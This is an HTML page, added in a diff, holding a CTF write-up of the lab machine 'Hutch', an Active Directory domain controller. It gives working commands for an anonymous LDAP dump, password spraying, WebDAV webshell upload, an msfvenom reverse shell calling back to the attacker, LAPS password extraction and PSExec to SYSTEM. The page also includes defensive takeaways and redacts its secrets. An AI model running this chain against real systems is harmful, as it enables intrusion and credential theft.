@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hutch &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Hutch</h1>
+    <div class="meta">Target: <code>192.168.190.122</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">LDAP</span><span class="tag">PasswordInDescription</span><span class="tag">WebDAV</span><span class="tag">LAPS</span><span class="tag">PSExec</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#ldap-dump-password-in-description">LDAP Dump, Password in Description</a><a class="lvl3" href="#webdav-shell-upload">WebDAV Shell Upload</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#laps-password-via-authenticated-ldap-query">LAPS Password via Authenticated LDAP Query</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Hutch is an Active Directory domain controller where the foothold path runs entirely through LDAP misconfigurations and WebDAV. An anonymous LDAP dump surfaces a cleartext password stored in a user's AD description field. Those credentials authenticate against a WebDAV-enabled IIS server, which accepts an uploaded ASPX webshell and reverse shell binary. From there, LAPS (Local Administrator Password Solution) is deployed but misconfigured, an LDAP query with the found credentials reads the managed administrator password, and PSExec completes the root.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-webdav-scan:
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+88/tcp   open  kerberos-sec
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec)
+445/tcp  open  microsoft-ds
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
+</code></pre>
+<p>Two things stand out: WebDAV is enabled on port 80 (the HTTP methods include <code>PUT</code> and <code>DELETE</code>), and the domain is <code>hutch.offsec</code>, hostname <code>HUTCHDC</code>. LDAP is the first enumeration target.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ldap-dump-password-in-description">LDAP Dump, Password in Description</h3>
+<p>An anonymous LDAP bind with <code>ldapsearch</code> dumps all objects. Within the user entries, one description field contains a cleartext password:</p>
+<pre><code class="language-sh">ldapsearch -v -x -b &quot;DC=hutch,DC=offsec&quot; -H &quot;ldap://192.168.190.122&quot; &quot;(objectclass=*)&quot;
+
+# Freddy McSorley, Users, hutch.offsec
+description: Password set to ‹redacted› at user's request. Please change on next login.
+</code></pre>
+<blockquote>
+<p><strong>Why passwords in LDAP descriptions are a real problem:</strong> AD description fields are readable by any domain user, and in misconfigured environments by anonymous binds. Admins sometimes use them as a change-tracking note, never considering that the field is part of a directory that tools like ldapsearch, BloodHound, or PowerView will harvest automatically. It's one of the first things to grep in an LDAP dump.</p>
+</blockquote>
+<p>Extracting all <code>sAMAccountName</code> values produces a user list. Kerbrute validates them, and spraying <code>‹redacted›</code> against all accounts finds one hit:</p>
+<pre><code class="language-sh">nxc smb 192.168.190.122 -u ~/users.txt -p '‹redacted›' -d hutch.offsec
+SMB  192.168.190.122  445  HUTCHDC  [+] hutch.offsec\fmcsorley:‹redacted›
+</code></pre>
+<p>Credentials:</p>
+<pre><code>fmcsorley : ‹redacted›
+</code></pre>
+<p>Direct WinRM or SMB auth doesn't provide a shell, but the account works for LDAP queries and is enough to interact with WebDAV.</p>
+<h3 id="webdav-shell-upload">WebDAV Shell Upload</h3>
+<p>Nmap confirmed WebDAV with PUT enabled. Uploading an ASPX webshell (<code>cmdasp.aspx</code> from <code>/usr/share/webshells/aspx</code>) via WebDAV places it in the IIS web root:</p>
+<pre><code class="language-sh">davtest -url http://192.168.190.122 -auth fmcsorley:‹redacted›
+# or cadaver / curl PUT
+</code></pre>
+<p>Confirming RCE with <code>whoami</code> and <code>dir</code> via the webshell, then generating and uploading a reverse shell binary:</p>
+<pre><code class="language-sh">msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe &gt; rev.exe
+</code></pre>
+<p>Executing from the webshell:</p>
+<pre><code>C:\inetpub\wwwroot\rev.exe
+</code></pre>
+<p>Shell caught as the IIS default app pool account:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [...] from (UNKNOWN) [192.168.190.122] 50727
+
+c:\windows\system32\inetsrv&gt; whoami
+iis apppool\defaultapppool
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="laps-password-via-authenticated-ldap-query">LAPS Password via Authenticated LDAP Query</h3>
+<p>Checking <code>C:\Program Files</code> reveals a <code>LAPS\</code> folder with <code>AdmPwd.UI.exe</code> and <code>AdmPwd.Utils.dll</code>, LAPS is deployed. LAPS stores the current local administrator password in the <code>ms-Mcs-AdmPwd</code> LDAP attribute on the computer object. Only certain groups can read it, but <code>fmcsorley</code>'s credentials are worth trying:</p>
+<pre><code class="language-sh">ldapsearch -x -H 'ldap://192.168.190.122' -D 'hutch\fmcsorley' -w '‹redacted›' \
+  -b 'dc=hutch,dc=offsec' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd
+
+ms-Mcs-AdmPwd: ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>LAPS access control failures:</strong> LAPS is designed so that only authorized groups (typically helpdesk or domain admins) can read the <code>ms-Mcs-AdmPwd</code> attribute. When a regular domain user has been granted access, even accidentally via group membership or direct ACL misconfiguration, they can query that attribute and retrieve the current machine's local administrator password in plaintext. LAPS solves the shared-password problem but only if read access is tightly controlled.</p>
+</blockquote>
+<p>With the LAPS administrator password, PSExec delivers a SYSTEM shell via SMB:</p>
+<pre><code class="language-sh">impacket-psexec hutch.offsec/administrator:'‹redacted›'@192.168.190.122
+[*] Found writable share ADMIN$
+[*] Uploading file VYlBbmuo.exe
+[*] Creating service aESY on 192.168.190.122.....
+[*] Starting service aESY.....
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<p>Flags:</p>
+<pre><code>local.txt:  ‹redacted›
+proof.txt:  ‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Grep every LDAP description field.</strong> Admins who use descriptions as change-log notes often leave cleartext passwords that survive for years because nobody looks there.</li>
+<li><strong>WebDAV PUT + IIS = instant shell.</strong> When Nmap shows WebDAV with write methods, test whether authenticated PUT uploads executable files to the web root. ASPX webshells are a clean first step.</li>
+<li><strong>LAPS is only as secure as its ACLs.</strong> Deploying LAPS and then over-sharing <code>ms-Mcs-AdmPwd</code> read access defeats the entire purpose. Always verify that only privileged groups have that attribute read permission.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
